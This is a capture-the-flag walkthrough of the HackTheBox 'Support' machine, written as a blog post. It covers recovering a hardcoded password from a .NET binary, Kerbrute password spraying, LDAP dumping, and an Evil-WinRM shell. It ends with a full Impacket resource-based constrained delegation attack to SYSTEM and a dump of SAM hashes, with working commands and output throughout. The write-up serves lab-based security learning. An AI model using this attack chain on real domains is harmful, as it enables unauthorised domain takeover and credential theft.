---
title: "Walk-through of Support from HackTheBox"
header:
  teaser: /assets/images/2022-08-06-16-10-57.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Windows
  - smbmap
  - dotPeek
  - Kerbrute
  - Ldapdomindump
  - Evil-WinRM
  - BloodHound
  - RBCD
  - Impacket
---

[Support](https://www.hackthebox.com/home/machines/profile/484) is an easy level machine by [0xdf](https://www.hackthebox.com/home/users/profile/4935) on [HackTheBox](https://www.hackthebox.com/home). This Windows box explores the risks of insecure permissions in an Active Directory environment.

## Machine Information

![support](/assets/images/2022-08-06-16-10-57.png)

On this box we start with an open file share where we find an interesting file. Reversing it we retrieve a password which lets us use Kerbrute and Ldapdomaindump to eventually enumerate Active Directory. More credentials are found and used with BloodHound to find our attack path to root is via resource based constrained delegation.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Support](https://www.hackthebox.com/home/machines/profile/484) |
| Machine Release Date | 30th July 2022 |
| Date I Completed It | 10th August 2022 |
| Distribution Used | Kali 2022.2 – [Release Info](https://www.kali.org/blog/kali-linux-2022-2-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.174 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~/htb/support]
└─# nmap -p$ports -sC -sV -oA support 10.10.11.174
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 16:08 BST
Nmap scan report for 10.10.11.174
Host is up (0.029s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-06 15:08:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
53021/tcp open  msrpc         Microsoft Windows RPC
53715/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Nmap done: 1 IP address (1 host up) scanned in 96.71 seconds
```

## SMB

It's a Windows box so lots of open ports. When I eventually got to looking at SMB on port 445 we find read access to a share:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# smbmap -u pencer -H 10.10.11.174
[+] Guest session       IP: 10.10.11.174:445    Name: 10.10.11.174
    Disk                Permissions     Comment
    ----                -----------     -------
    ADMIN$              NO ACCESS       Remote Admin
    C$                  NO ACCESS       Default share
    IPC$                READ ONLY       Remote IPC
    NETLOGON            NO ACCESS       Logon server share 
    support-tools       READ ONLY       support staff tools
    SYSVOL              NO ACCESS       Logon server share 
```

Looking in there we find a few files:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# smbmap -u pencer -H 10.10.11.174 -r support-tools
[+] Guest session       IP: 10.10.11.174:445    Name: 10.10.11.174
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        support-tools                                           READ ONLY
        .\support-tools\*
        dr--r--r--                0 Wed Jul 20 18:01:06 2022    .
        dr--r--r--                0 Sat May 28 12:18:25 2022    ..
        fr--r--r--          2880728 Sat May 28 12:19:19 2022    7-ZipPortable_21.07.paf.exe
        fr--r--r--          5439245 Sat May 28 12:19:55 2022    npp.8.4.1.portable.x64.zip
        fr--r--r--          1273576 Sat May 28 12:20:06 2022    putty.exe
        fr--r--r--         48102161 Sat May 28 12:19:31 2022    SysinternalsSuite.zip
        fr--r--r--           277499 Wed Jul 20 18:01:07 2022    UserInfo.exe.zip
        fr--r--r--            79171 Sat May 28 12:20:17 2022    windirstat1_1_2_setup.exe
        fr--r--r--         44398000 Sat May 28 12:19:43 2022    WiresharkPortable64_3.6.5.paf.exe
```

Of those UserInfo.exe.zip is not familiar and has a different creation date. Let's grab it:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# smbmap -u pencer -H 10.10.11.174 -r support-tools -A 'User'
[+] Guest session       IP: 10.10.11.174:445    Name: 10.10.11.174
[+] Starting search for files matching 'User' on share support-tools.
[+] Match found! Downloading: support-tools\UserInfo.exe.zip
```

## Suspicious File Investigation

I tried it on my Windows VM out of interest:

```powershell
C:\Users\Downloads\10.10.11.174-support-tools_UserInfo.exe>UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
```

## dotPeek

I couldn't get much out of it on the command line so I fired up [dotPeek](https://www.jetbrains.com/decompiler/) from [JetBrains](https://www.jetbrains.com/) and had a look at it:

![support-dotpeek-userinfo](/assets/images/2022-08-06-16-53-22.png)

There's a class called Protected and a string called enc_password, sounds interesting. If you highlight one of them and press F12 it takes you to the class:

![support-userinfo-protected-class](/assets/images/2022-08-06-16-57-02.png)

We can break this down easily. First we have two variables, enc_password and key:

```c
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

Next we base64 decode the value of the enc_password string:

```c
      byte[] numArray = Convert.FromBase64String(Protected.enc_password);
```

Then we create a new variable called bytes and store that base64 decoded value in it:

```c
      byte[] bytes = numArray;
```

Finally we go in to a loop, and for each character in the bytes variable we're doing an xor on it using the key variable, and then xoring the result of that by 223:

```c
      for (int index = 0; index < numArray.Length; ++index)
        bytes[index] = (byte) ((int) numArray[index] ^ (int) Protected.key[index % Protected.key.Length] ^ 223);
```

The result of that will be a decrypted string. I used an online C# compiler called [.NET Fiddle](https://dotnetfiddle.net/) to get me the value with just a little change to the code:

```c
using System;
using System.Text;

public class Protected
{
  private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
  private static byte[] key = Encoding.ASCII.GetBytes("armando");

  public static void getPassword()
  {
    byte[] numArray = Convert.FromBase64String(enc_password);
    byte[] bytes = numArray;
    for (int index = 0; index < numArray.Length; ++index)
      bytes[index] = (byte) ((int) numArray[index] ^ (int) key[index % key.Length] ^ 223);
    Console.WriteLine(Encoding.Default.GetString(bytes));
  }

  public static void Main()
  {
    getPassword();
  }
 }
 ```

Run that using the online compiler and you'll get the answer:

```text
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

## Kerbrute

I don't know what this is for at the moment. Back to more enumeration, this time using [Kerbrute](https://github.com/ropnop/kerbrute) to look for usernames. We've used this a few times, most recently on [Scrambled](https://pencer.io/ctf/ctf-htb-scrambled-protected) and an old TryHackMe room called [Attacktive](https://pencer.io/ctf/ctf-thm-attacktive/#task-4---kerbrute).

Grab it if needed then try a dictionary or two for your username list:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
--2022-08-07 23:01:22--  https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>HTTP request sent, awaiting response... 200 OK
Length: 8286607 (7.9M) [application/octet-stream]
Saving to: ‘kerbrute_linux_amd64’
kerbrute_linux_amd64    100%[=============================================>]   7.90M  6.91MB/s    in 1.1s
2022-08-07 23:01:24 (6.91 MB/s) - ‘kerbrute_linux_amd64’ saved [8286607/8286607]

┌──(root㉿kali)-[~/htb/support]
└─# chmod +x kerbrute_linux_amd64 

┌──(root㉿kali)-[~/htb/support]
└─# ./kerbrute_linux_amd64 userenum -d support.htb --dc support.htb /usr/share/wordlists/dirb/small.txt -t 100 -o kerbrute.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
Version: v1.0.3 (9dad6e1) - 08/07/22 - Ronnie Flathers @ropnop

2022/08/07 23:07:57 >  Using KDC(s):
2022/08/07 23:07:57 >   support.htb:88

2022/08/07 23:07:57 >  [+] VALID USERNAME:       administrator@support.htb
2022/08/07 23:07:57 >  [+] VALID USERNAME:       guest@support.htb
2022/08/07 23:07:57 >  [+] VALID USERNAME:       ldap@support.htb
2022/08/07 23:07:57 >  [+] VALID USERNAME:       management@support.htb
2022/08/07 23:07:57 >  [+] VALID USERNAME:       support@support.htb
2022/08/07 23:07:57 >  Done! Tested 959 usernames (5 valid) in 0.453 seconds
```

We have five valid usernames. Let's create a userlist from that output:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# cat kerb-user.txt | grep USERNAME: | cut -d ' ' -f 8 > users.txt

┌──(root㉿kali)-[~/htb/support]
└─# cat users.txt 
administrator@support.htb
guest@support.htb
management@support.htb
ldap@support.htb
support@support.htb
 ```

Now try a password spray with Kerbrute, the usernames, and the password we found before:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# ./kerbrute_linux_amd64 passwordspray -d support.htb --dc support.htb users.txt 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
Version: v1.0.3 (9dad6e1) - 08/07/22 - Ronnie Flathers @ropnop

2022/08/07 23:17:49 >  Using KDC(s):
2022/08/07 23:17:49 >   support.htb:88
2022/08/07 23:17:49 >  [+] VALID LOGIN:  ldap@support.htb:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
2022/08/07 23:17:49 >  Done! Tested 5 logins (1 successes) in 0.098 seconds
```

## Ldapdomaindump

So now we have a user called ldap with valid credentials. Next we can use ldapdomaindump, just like we did on the box [Intelligence](https://pencer.io/ctf/ctf-htb-intelligence/) a while back, to get get the whole directory:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# ldapdomaindump 10.10.11.174 -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

This gives us a number of files containing everything from AD:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# ll
-rw-r--r-- 1 root root    2454 Aug  8 22:07 domain_computers_by_os.html
-rw-r--r-- 1 root root     669 Aug  8 22:07 domain_computers.grep
-rw-r--r-- 1 root root    1848 Aug  8 22:07 domain_computers.html
-rw-r--r-- 1 root root    9793 Aug  8 22:07 domain_computers.json
-rw-r--r-- 1 root root   10334 Aug  8 22:07 domain_groups.grep
-rw-r--r-- 1 root root   17332 Aug  8 22:07 domain_groups.html
-rw-r--r-- 1 root root   79816 Aug  8 22:07 domain_groups.json
-rw-r--r-- 1 root root     265 Aug  8 22:07 domain_policy.grep
-rw-r--r-- 1 root root    1161 Aug  8 22:07 domain_policy.html
-rw-r--r-- 1 root root    5608 Aug  8 22:07 domain_policy.json
-rw-r--r-- 1 root root      71 Aug  8 22:07 domain_trusts.grep
-rw-r--r-- 1 root root     828 Aug  8 22:07 domain_trusts.html
-rw-r--r-- 1 root root       2 Aug  8 22:07 domain_trusts.json
-rw-r--r-- 1 root root   17705 Aug  8 22:07 domain_users_by_group.html
-rw-r--r-- 1 root root    4588 Aug  8 22:07 domain_users.grep
-rw-r--r-- 1 root root   11468 Aug  8 22:07 domain_users.html
-rw-r--r-- 1 root root   50289 Aug  8 22:07 domain_users.json
```

## User Credentials

It took a fair bit of looking through them but eventually I found this:

```json
┌──(root㉿kali)-[~/htb/support]
└─# cat domain_users.json | grep -A3 CN=support
            "CN=support,CN=Users,DC=support,DC=htb"
        ],
        "info": [
            "Ironside47pleasure40Watchful"
```

We have a user called support with what looks like a password. Our nmap scan told us port 5985 is open, so we can use Evil-WinRM to get us a shell. We've used this a few times, an old but fun box from 2021 called [Return](https://pencer.io/ctf/ctf-htb-return/) is worth looking at.

## Evil-WinRM

Install if needed then use the creds we've found:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful
Evil-WinRM shell v3.4
*Evil-WinRM* PS C:\Users\support\Documents>
```

## User Flag

Grab the user flag first:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> type ..\Desktop\user.txt
0055fed644625bf18ae6d47461bbcf87
```

My usual starting point on Windows boxes in a domain is to use [Bloodhound](https://github.com/BloodHoundAD/BloodHound). I covered it recently on the box [StreamIO](https://pencer.io/ctf/ctf-htb-streamio-protected), where we looked at using SharpHound to dump the info and then copy over to Kali for investigating in Bloodhound. This time I'll use that fantastic Python implementation of it [here](https://github.com/fox-it/BloodHound.py) and we can do all the work from Kali.

## BloodHound

Before we start you'll need BloodHound and Neo4j set up on Kali, if you need help with that then I covered it [here](https://pencer.io/ctf/ctf-thm-postexploit) on an old TryHackMe room.

Once you have that setup let's grab the python script and run it:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# git clone https://github.com/fox-it/BloodHound.py.git
Cloning into 'BloodHound.py'...
remote: Enumerating objects: 1141, done.
remote: Counting objects: 100% (224/224), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 1141 (delta 193), reused 182 (delta 177), pack-reused 917
Receiving objects: 100% (1141/1141), 474.25 KiB | 2.58 MiB/s, done.
Resolving deltas: 100% (772/772), done.

┌──(root㉿kali)-[~/htb/support]
└─# cd BloodHound.py

┌──(root㉿kali)-[~/htb/support/BloodHound.py]
└─# python3 setup.py install 
running install
running bdist_egg
running egg_info
creating bloodhound.egg-info
writing bloodhound.egg-info/PKG-INFO
writing dependency_links to bloodhound.egg-info/dependency_links.txt
writing entry points to bloodhound.egg-info/entry_points.txt
writing requirements to bloodhound.egg-info/requires.txt
writing top-level names to bloodhound.egg-info/top_level.txt
writing manifest file 'bloodhound.egg-info/SOURCES.txt'
reading manifest file 'bloodhound.egg-info/SOURCES.txt'
<SNIP>

┌──(root㉿kali)-[~/htb/support/BloodHound.py]
└─# python3 bloodhound.py -u support@support.htb -p Ironside47pleasure40Watchful -dc dc.support.htb -d support.htb -ns 10.10.11.174 --zip -c All
INFO: Found AD domain: support.htb
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Machine.support.htb
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 05S
INFO: Compressing output into 20220810113012_bloodhound.zip
```

Drop that zip in to Bloodhound and have a look around. Eventually you'll find that the user **support** is in the security group **Shared Support Accounts**:

![support-support-user](/assets/images/2022-08-10-12-13-31.png)

And that **Shared Support Accounts** group has GenericAll rights over the domain controller:

![support-genericall](/assets/images/2022-08-10-12-14-51.png)

If you right click on the GenericAll link between the two nodes and look at the help:

```text
The members of the group SHARED SUPPORT ACCOUNTS@SUPPORT.HTB have GenericAll privileges to the computer DC.SUPPORT.HTB.

This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.
```

In the abuse section it also says:

```text
Full control of a computer object can be used to perform a resource based constrained delegation attack.
```

## RBCD

This is all the clues you need to figure out how to take advantage of our current position as the **support** user.

Resource Based Constrained Delegation attacks are well documented. In fact the abuse section of Bloodhound gives you a step by step. If you want to learn more then here's a few good guides I found:

1. [AD RBCD Attack Path](https://www.adamcouch.co.uk/active-directory-resource-based-constrained-delegation-attack-path/)
2. [RBCD computer DACL takeover demo](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
3. [Domain Escalation RBCD](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)
4. [A Low Dive Into Kerberos Delegations](https://luemmelsec.github.io/S4fuckMe2selfAndUAndU2proxy-A-low-dive-into-Kerberos-delegations/)

These are all based on Rubeus uploaded to the box. I wanted to do it all from Kali so used [this](https://hakin9.org/rbcd-attack-kerberos-resource-based-constrained-delegation-attack-from-outside-using-impacket/)
 one which uses Impacket scripts for the entire attack path.

## Impacket AddComputer

First we need to add a fake computer:

```sh
┌──(root㉿kali)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -dc-ip 10.10.11.174 -computer-pass pencer -computer-name pencer support.htb/support:Ironside47pleasure40Watchful
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Successfully added machine account pencer$ with password pencer.
```

## Impacket RBCD

Next we use our GenericAll rights on the DC to set the **msds-allowedtoactonbehalfofotheridentity** security descriptor to our newly created computer:

```sh
┌──(root㉿kali)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-to "dc$" -delegate-from "pencer$" -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Accounts allowed to act on behalf of other identity:
[*]     Pepegaclap$   (S-1-5-21-1677581083-3380853377-188903654-5106)
[*] Delegation rights modified successfully!
[*] pencer$ can now impersonate users on dc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     Pepegaclap$   (S-1-5-21-1677581083-3380853377-188903654-5106)
[*]     pencer$      (S-1-5-21-1677581083-3380853377-188903654-5104)
```

## Impacket getST

Now we take advantage of S4U2Self by impersonating the **administrator** user to request a service ticket:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# python3 /usr/share/doc/python3-impacket/examples/getST.py support.htb/pencer$:pencer -spn www/dc.support.htb -impersonate administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

Now we export it and check:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# export KRB5CCNAME=administrator.ccache

┌──(root㉿kali)-[~/htb/support]
└─# klist
Ticket cache: FILE:administrator.ccache
Default principal: administrator@support.htb

Valid starting       Expires              Service principal
08/10/2022 14:58:10  08/11/2022 00:58:10  www/dc.support.htb@SUPPORT.HTB
        renew until 08/11/2022 14:58:13
```

## Impacket PSExec

Finally we can use that Kerberos ticket to connect as the administrator user:

```sh
┌──(root㉿kali)-[~/htb/support]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass support.htb/administrator@dc.support.htb -dc-ip 10.10.11.174
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file ubdUnXDm.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service FLKe on dc.support.htb.....
[*] Starting service FLKe.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## Root Flag

Let's get the root flag to complete the box:

```text
C:\Windows\system32> type c:\users\administrator\desktop\root.txt
6827054ff3ad6fa0e808270351be323c
```

## Password Hashes

Copy sam and system registry hive over to Kali then use secretsdump to get the hashes:

```sh
┌──(root㉿kali)-[~]
└─# impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Target system bootKey: 0xf678b2597ade18d88784ee424ddc0d1a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

## Root+1

For extra points let's look at how we could have got this done without Bloodhound by using PowerShell on the box:

First look for computers in the Domain:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Filter * -Properties * | Select -Property Name,DNSHostName,Enabled,LastLogonDate
Name       DNSHostName            Enabled LastLogonDate
----       -----------            ------- -------------
DC         dc.support.htb            True 8/8/2022 7:43:48 AM
MANAGEMENT Management.support.htb    True 7/21/2022 6:19:20 AM
```

Check the Domain still has the default policy of allowing users to add up to 10 machines:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
DistinguishedName         : DC=support,DC=htb
ms-DS-MachineAccountQuota : 10
Name                      : support
ObjectClass               : domainDNS
ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
```

Find the SID of the security group we found the support user was a member of:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> get-adgroup "Shared Support Accounts" | select SID

SID
---
S-1-5-21-1677581083-3380853377-188903654-1103
```

Confirm the same SID from above has excessive rights on the Domain Controller object:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObjectACL "dc.support.htb" | ?{$_.SecurityIdentifier -match S-1-5-21-1677581083-3380853377-188903654-1103}
ObjectDN              : CN=DC,OU=Domain Controllers,DC=support,DC=htb
ObjectSID             : S-1-5-21-1677581083-3380853377-188903654-1000
ActiveDirectoryRights : GenericAll
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983551
SecurityIdentifier    : S-1-5-21-1677581083-3380853377-188903654-1103
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

This would have told us we have GenericAll control over the DC. Which we abuse to set ActOnBehalf rights to a newly added machine/computer:

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> $x = Get-ADComputer dc -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
*Evil-WinRM* PS C:\Users\support\Documents> $x.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : SUPPORT\pencer$
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

Of course it's more fun playing with Bloodhound :)

That's another box done. See you next time.
